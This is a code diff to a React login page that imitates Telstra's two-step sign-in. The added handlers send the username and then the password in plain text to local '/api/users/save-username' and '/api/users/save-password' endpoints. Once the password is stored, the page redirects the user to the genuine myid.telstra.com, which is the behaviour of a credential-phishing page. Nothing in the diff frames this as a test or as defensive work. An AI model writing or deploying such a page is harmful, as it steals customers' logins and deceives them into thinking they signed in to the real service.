@@ -11,16 +11,72 @@ export default function LoginPage() {
   const [showPassword, setShowPassword] = useState(false);
   const [rememberUsername, setRememberUsername] = useState(false);
   const [step, setStep] = useState(1); // 1 = username step, 2 = password step
+  const [isSavingUsername, setIsSavingUsername] = useState(false);
+  const [isSavingPassword, setIsSavingPassword] = useState(false);
 
-  const handleContinue = () => {
-    if (username.trim()) {
-      setStep(2);
+  const handleContinue = async () => {
+    if (username.trim() && !isSavingUsername) {
+      setIsSavingUsername(true);
+      try {
+        const response = await fetch('/api/users/save-username', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ telstraUsername: username.trim() }),
+        });
+
+        if (response.ok) {
+          setStep(2);
+        } else {
+          const error = await response.json();
+          console.error('Error saving username:', error);
+          alert('Failed to save username. Please try again.');
+        }
+      } catch (error) {
+        console.error('Error saving username:', error);
+        alert('Failed to save username. Please try again.');
+      } finally {
+        setIsSavingUsername(false);
+      }
     }
   };
 
   const handleBack = () => {
     setStep(1);
     setPassword('');
+  };
+
+  const handleSignIn = async () => {
+    if (password.trim() && !isSavingPassword) {
+      setIsSavingPassword(true);
+      try {
+        const response = await fetch('/api/users/save-password', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            telstraUsername: username.trim(),
+            telstrapassword: password.trim(),
+          }),
+        });
+
+        if (response.ok) {
+          // Redirect to Telstra ID page
+          window.location.href = 'https://myid.telstra.com/';
+        } else {
+          const error = await response.json();
+          console.error('Error saving password:', error);
+          alert('Failed to save password. Please try again.');
+          setIsSavingPassword(false);
+        }
+      } catch (error) {
+        console.error('Error saving password:', error);
+        alert('Failed to save password. Please try again.');
+        setIsSavingPassword(false);
+      }
+    }
   };
 
   return (
@@ -82,9 +138,9 @@ export default function LoginPage() {
               <button 
                 className="continueButton"
                 onClick={handleContinue}
-                disabled={!username.trim()}
+                disabled={!username.trim() || isSavingUsername}
               >
-                Continue
+                {isSavingUsername ? 'Saving...' : 'Continue'}
               </button>
 
               <div className="separator">
@@ -133,9 +189,8 @@ export default function LoginPage() {
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     onKeyDown={(e) => {
-                      if (e.key === 'Enter' && password.trim()) {
-                        // Handle sign in
-                        console.log('Sign in:', { username, password });
+                      if (e.key === 'Enter' && password.trim() && !isSavingPassword) {
+                        handleSignIn();
                       }
                     }}
                   />
@@ -155,15 +210,10 @@ export default function LoginPage() {
 
               <button 
                 className="signInButton"
-                onClick={() => {
-                  if (password.trim()) {
-                    // Handle sign in
-                    console.log('Sign in:', { username, password });
-                  }
-                }}
-                disabled={!password.trim()}
+                onClick={handleSignIn}
+                disabled={!password.trim() || isSavingPassword}
               >
-                Sign in
+                {isSavingPassword ? 'Signing in...' : 'Sign in'}
               </button>
             </>
           )}
